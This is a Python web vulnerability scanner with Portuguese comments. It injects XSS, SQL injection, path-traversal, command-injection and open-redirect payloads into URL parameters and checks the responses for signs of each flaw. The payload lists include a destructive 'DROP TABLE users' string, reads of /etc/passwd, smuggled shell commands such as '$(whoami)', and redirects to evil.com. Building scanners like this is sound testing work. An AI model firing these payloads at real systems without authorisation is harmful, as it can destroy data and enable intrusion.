#!/usr/bin/env python3
"""
Módulo de Testes de Vulnerabilidades Web
XSS, SQL Injection, CSRF, etc.
"""

import re
import json
import time
import requests
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from utils.logger import obter_logger


class TestadorVulnerabilidadesWeb:
    """Classe para testar vulnerabilidades web"""

    def __init__(self):
        self.logger = obter_logger("TestadorWeb")
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # Payloads para testes
        self.payloads_xss = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]

        self.payloads_sql = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL --",
            "1; DROP TABLE users --"
        ]

        self.payloads_lfi = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "../../../../../../../../etc/passwd"
        ]

        self.payloads_command_injection = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "; id"
        ]

    def testar_xss(self, url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """Testa vulnerabilidades XSS"""
        self.logger.info(f"🕷️ Testando XSS em: {url}")

        resultados = {
            'url': url,
            'tipo_teste': 'xss',
            'vulnerabilidades': [],
            'parametros_testados': 0,
            'tempo_execucao': 0
        }

        inicio = time.time()

        try:
            # Se não foram fornecidos parâmetros, tentar descobrir
            if not params:
                params = self._descobrir_parametros(url)

            resultados['parametros_testados'] = len(params)

            for param, valor in params.items():
                for payload in self.payloads_xss:
                    # Testar via GET
                    params_teste = params.copy()
                    params_teste[param] = payload

                    try:
                        resposta = self.session.get(url, params=params_teste, timeout=10)
                        conteudo = resposta.text.lower()

                        # Verificar se o payload foi refletido sem sanitização
                        if payload.lower() in conteudo:
                            # Verificar se não foi sanitizado
                            if '<script>' in conteudo or 'onerror=' in conteudo:
                                resultados['vulnerabilidades'].append({
                                    'parametro': param,
                                    'payload': payload,
                                    'tipo': 'reflected_xss',
                                    'severidade': 'alta',
                                    'evidencia': f'Payload refletido: {payload[:50]}...'
                                })
                                self.logger.warning(f"🚨 XSS encontrado em {param}: {payload}")

                    except Exception as e:
                        self.logger.debug(f"Erro testando {param}: {e}")

        except Exception as e:
            self.logger.error(f"Erro no teste XSS: {e}")
            resultados['erro'] = str(e)

        resultados['tempo_execucao'] = time.time() - inicio
        return resultados

    def testar_sql_injection(self, url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """Testa vulnerabilidades SQL Injection"""
        self.logger.info(f"💉 Testando SQL Injection em: {url}")

        resultados = {
            'url': url,
            'tipo_teste': 'sql_injection',
            'vulnerabilidades': [],
            'parametros_testados': 0,
            'tempo_execucao': 0
        }

        inicio = time.time()

        try:
            if not params:
                params = self._descobrir_parametros(url)

            resultados['parametros_testados'] = len(params)

            for param, valor in params.items():
                for payload in self.payloads_sql:
                    params_teste = params.copy()
                    params_teste[param] = payload

                    try:
                        resposta = self.session.get(url, params=params_teste, timeout=10)
                        conteudo = resposta.text.lower()

                        # Verificar sinais de SQL injection
                        sinais_sql = [
                            'mysql', 'sql', 'syntax', 'error',
                            'oracle', 'postgresql', 'sqlite',
                            'you have an error in your sql syntax'
                        ]

                        if any(sinal in conteudo for sinal in sinais_sql):
                            resultados['vulnerabilidades'].append({
                                'parametro': param,
                                'payload': payload,
                                'tipo': 'sql_injection',
                                'severidade': 'critica',
                                'evidencia': f'Erro SQL detectado com payload: {payload}'
                            })
                            self.logger.warning(f"🚨 SQL Injection encontrado em {param}")

                    except Exception as e:
                        self.logger.debug(f"Erro testando {param}: {e}")

        except Exception as e:
            self.logger.error(f"Erro no teste SQL: {e}")
            resultados['erro'] = str(e)

        resultados['tempo_execucao'] = time.time() - inicio
        return resultados

    def testar_lfi(self, url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """Testa vulnerabilidades Local File Inclusion"""
        self.logger.info(f"📁 Testando LFI em: {url}")

        resultados = {
            'url': url,
            'tipo_teste': 'lfi',
            'vulnerabilidades': [],
            'parametros_testados': 0,
            'tempo_execucao': 0
        }

        inicio = time.time()

        try:
            if not params:
                params = self._descobrir_parametros(url)

            resultados['parametros_testados'] = len(params)

            for param, valor in params.items():
                for payload in self.payloads_lfi:
                    params_teste = params.copy()
                    params_teste[param] = payload

                    try:
                        resposta = self.session.get(url, params=params_teste, timeout=10)

                        # Verificar se conseguiu incluir arquivo
                        if resposta.status_code == 200:
                            conteudo = resposta.text.lower()

                            # Verificar sinais de sucesso na inclusão
                            sinais_lfi = [
                                'root:', 'daemon:', 'bin/bash',
                                '[boot loader]', 'system32',
                                'etc/passwd', 'windows/system32'
                            ]

                            if any(sinal in conteudo for sinal in sinais_lfi):
                                resultados['vulnerabilidades'].append({
                                    'parametro': param,
                                    'payload': payload,
                                    'tipo': 'local_file_inclusion',
                                    'severidade': 'critica',
                                    'evidencia': f'Arquivo incluído com sucesso: {payload}'
                                })
                                self.logger.warning(f"🚨 LFI encontrado em {param}")

                    except Exception as e:
                        self.logger.debug(f"Erro testando {param}: {e}")

        except Exception as e:
            self.logger.error(f"Erro no teste LFI: {e}")
            resultados['erro'] = str(e)

        resultados['tempo_execucao'] = time.time() - inicio
        return resultados

    def testar_command_injection(self, url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """Testa vulnerabilidades Command Injection"""
        self.logger.info(f"⚡ Testando Command Injection em: {url}")

        resultados = {
            'url': url,
            'tipo_teste': 'command_injection',
            'vulnerabilidades': [],
            'parametros_testados': 0,
            'tempo_execucao': 0
        }

        inicio = time.time()

        try:
            if not params:
                params = self._descobrir_parametros(url)

            resultados['parametros_testados'] = len(params)

            for param, valor in params.items():
                for payload in self.payloads_command_injection:
                    params_teste = params.copy()
                    params_teste[param] = payload

                    try:
                        resposta = self.session.get(url, params=params_teste, timeout=10)
                        conteudo = resposta.text.lower()

                        # Verificar sinais de command injection
                        sinais_command = [
                            'uid=', 'gid=', 'groups=',
                            'root', 'www-data', 'apache',
                            'directory', 'total'
                        ]

                        if any(sinal in conteudo for sinal in sinais_command):
                            resultados['vulnerabilidades'].append({
                                'parametro': param,
                                'payload': payload,
                                'tipo': 'command_injection',
                                'severidade': 'critica',
                                'evidencia': f'Comando executado: {payload}'
                            })
                            self.logger.warning(f"🚨 Command Injection encontrado em {param}")

                    except Exception as e:
                        self.logger.debug(f"Erro testando {param}: {e}")

        except Exception as e:
            self.logger.error(f"Erro no teste Command Injection: {e}")
            resultados['erro'] = str(e)

        resultados['tempo_execucao'] = time.time() - inicio
        return resultados

    def testar_csrf(self, url: str) -> Dict[str, Any]:
        """Testa vulnerabilidades CSRF"""
        self.logger.info(f"🔄 Testando CSRF em: {url}")

        resultados = {
            'url': url,
            'tipo_teste': 'csrf',
            'vulnerabilidades': [],
            'tempo_execucao': 0
        }

        inicio = time.time()

        try:
            resposta = self.session.get(url, timeout=10)
            soup = BeautifulSoup(resposta.text, 'html.parser')

            # Procurar formulários sem tokens CSRF
            forms = soup.find_all('form')

            for form in forms:
                # Verificar se há campos CSRF comuns
                csrf_fields = form.find_all('input', {
                    'name': re.compile(r'csrf|token|_token|authenticity', re.I)
                })

                if not csrf_fields:
                    # Verificar se o formulário faz mudanças (POST, PUT, DELETE)
                    method = form.get('method', 'GET').upper()
                    if method in ['POST', 'PUT', 'DELETE']:
                        resultados['vulnerabilidades'].append({
                            'form_action': form.get('action', ''),
                            'method': method,
                            'tipo': 'csrf_missing_token',
                            'severidade': 'media',
                            'evidencia': f'Formulário {method} sem token CSRF'
                        })
                        self.logger.warning(f"🚨 Formulário sem CSRF: {form.get('action', '')}")

        except Exception as e:
            self.logger.error(f"Erro no teste CSRF: {e}")
            resultados['erro'] = str(e)

        resultados['tempo_execucao'] = time.time() - inicio
        return resultados

    def testar_open_redirect(self, url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """Testa vulnerabilidades Open Redirect"""
        self.logger.info(f"🔗 Testando Open Redirect em: {url}")

        resultados = {
            'url': url,
            'tipo_teste': 'open_redirect',
            'vulnerabilidades': [],
            'parametros_testados': 0,
            'tempo_execucao': 0
        }

        inicio = time.time()

        try:
            if not params:
                params = self._descobrir_parametros(url)

            resultados['parametros_testados'] = len(params)

            # Payloads de redirect
            payloads_redirect = [
                'http://evil.com',
                '//evil.com',
                'https://evil.com',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>'
            ]

            for param, valor in params.items():
                for payload in payloads_redirect:
                    params_teste = params.copy()
                    params_teste[param] = payload

                    try:
                        resposta = self.session.get(url, params=params_teste, timeout=10,
                                                  allow_redirects=False)

                        # Verificar se houve redirect para domínio externo
                        if resposta.status_code in [301, 302, 303, 307, 308]:
                            location = resposta.headers.get('Location', '')
                            if location and 'evil.com' in location:
                                resultados['vulnerabilidades'].append({
                                    'parametro': param,
                                    'payload': payload,
                                    'tipo': 'open_redirect',
                                    'severidade': 'media',
                                    'evidencia': f'Redirect para: {location}'
                                })
                                self.logger.warning(f"🚨 Open Redirect encontrado em {param}")

                    except Exception as e:
                        self.logger.debug(f"Erro testando {param}: {e}")

        except Exception as e:
            self.logger.error(f"Erro no teste Open Redirect: {e}")
            resultados['erro'] = str(e)

        resultados['tempo_execucao'] = time.time() - inicio
        return resultados

    def _descobrir_parametros(self, url: str) -> Dict[str, str]:
        """Descobre parâmetros da URL"""
        params = {}

        try:
            # Fazer requisição para ver a página
            resposta = self.session.get(url, timeout=10)
            soup = BeautifulSoup(resposta.text, 'html.parser')

            # Procurar formulários
            forms = soup.find_all('form')

            for form in forms:
                inputs = form.find_all('input')
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name and input_tag.get('type') not in ['submit', 'button', 'hidden']:
                        params[name] = input_tag.get('value', '')

            # Se não encontrou formulários, tentar parâmetros da URL
            parsed_url = urlparse(url)
            if parsed_url.query:
                params_url = parse_qs(parsed_url.query)
                for key, values in params_url.items():
                    params[key] = values[0] if values else ''

        except Exception as e:
            self.logger.debug(f"Erro descobrindo parâmetros: {e}")

        return params

    def executar_teste_completo(self, url: str) -> Dict[str, Any]:
        """Executa todos os testes de vulnerabilidades web"""
        self.logger.info(f"🔬 Iniciando teste completo de vulnerabilidades em: {url}")

        resultados_completos = {
            'url': url,
            'timestamp': time.time(),
            'testes_executados': [],
            'vulnerabilidades_totais': 0,
            'tempo_total': 0
        }

        inicio_total = time.time()

        # Lista de testes a executar
        testes = [
            ('xss', self.testar_xss),
            ('sql_injection', self.testar_sql_injection),
            ('lfi', self.testar_lfi),
            ('command_injection', self.testar_command_injection),
            ('csrf', self.testar_csrf),
            ('open_redirect', self.testar_open_redirect)
        ]

        for nome_teste, funcao_teste in testes:
            try:
                self.logger.info(f"Executando teste: {nome_teste}")

                if nome_teste in ['csrf']:
                    # Testes que não precisam de parâmetros
                    resultado = funcao_teste(url)
                else:
                    # Testes que podem descobrir parâmetros automaticamente
                    resultado = funcao_teste(url)

                resultados_completos['testes_executados'].append({
                    'teste': nome_teste,
                    'resultado': resultado
                })

                if 'vulnerabilidades' in resultado:
                    resultados_completos['vulnerabilidades_totais'] += len(resultado['vulnerabilidades'])

            except Exception as e:
                self.logger.error(f"Erro no teste {nome_teste}: {e}")
                resultados_completos['testes_executados'].append({
                    'teste': nome_teste,
                    'erro': str(e)
                })

        resultados_completos['tempo_total'] = time.time() - inicio_total

        self.logger.info(f"✅ Teste completo finalizado: {resultados_completos['vulnerabilidades_totais']} vulnerabilidades encontradas")
        return resultados_completos


# Funções de compatibilidade para o sistema
def testar_vulnerabilidades_web(url: str) -> Dict[str, Any]:
    """Função de compatibilidade para testar vulnerabilidades web"""
    testador = TestadorVulnerabilidadesWeb()
    return testador.executar_teste_completo(url)


def testar_xss_url(url: str) -> Dict[str, Any]:
    """Testa apenas XSS"""
    testador = TestadorVulnerabilidadesWeb()
    return testador.testar_xss(url)


def testar_sql_injection_url(url: str) -> Dict[str, Any]:
    """Testa apenas SQL Injection"""
    testador = TestadorVulnerabilidadesWeb()
    return testador.testar_sql_injection(url)


if __name__ == "__main__":
    # Exemplo de uso
    testador = TestadorVulnerabilidadesWeb()

    # Teste rápido
    url_teste = "http://localhost:8080/e-cidade/login.php"

    print("🧪 Testando vulnerabilidades web...")

    # Teste XSS
    resultado_xss = testador.testar_xss(url_teste)
    print(f"XSS - Vulnerabilidades: {len(resultado_xss['vulnerabilidades'])}")

    # Teste SQL
    resultado_sql = testador.testar_sql_injection(url_teste)
    print(f"SQL Injection - Vulnerabilidades: {len(resultado_sql['vulnerabilidades'])}")

    # Teste completo
    resultado_completo = testador.executar_teste_completo(url_teste)
    print(f"Teste completo - Total vulnerabilidades: {resultado_completo['vulnerabilidades_totais']}")
    print(f"Tempo total: {resultado_completo['tempo_total']:.2f}s")
